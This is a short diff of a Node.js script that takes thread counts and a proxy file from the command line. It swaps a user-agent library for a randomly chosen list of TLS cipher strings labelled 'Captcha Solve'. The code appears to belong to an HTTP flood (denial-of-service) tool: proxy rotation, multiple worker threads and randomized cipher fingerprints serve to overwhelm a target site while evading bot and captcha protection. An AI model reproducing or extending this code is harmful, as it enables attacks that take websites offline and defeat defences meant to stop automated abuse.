@@ -4,7 +4,7 @@ const net = require("net");
  const cluster = require("cluster");
  const url = require("url");
  const crypto = require("crypto");
- const UserAgent = require('user-agents');
+
  const fs = require("fs");
  
  process.setMaxListeners(0);
@@ -42,7 +42,10 @@ const net = require("net");
      threads: ~~process.argv[5],
      proxyFile: process.argv[6]
  }
- 
+ const cplist = [ // Captcha Solve by Ibaaall 10-04-2023
+     "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
+     "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
+     "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH"
  ];
  var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
  var proxies = readLines(args.proxyFile);
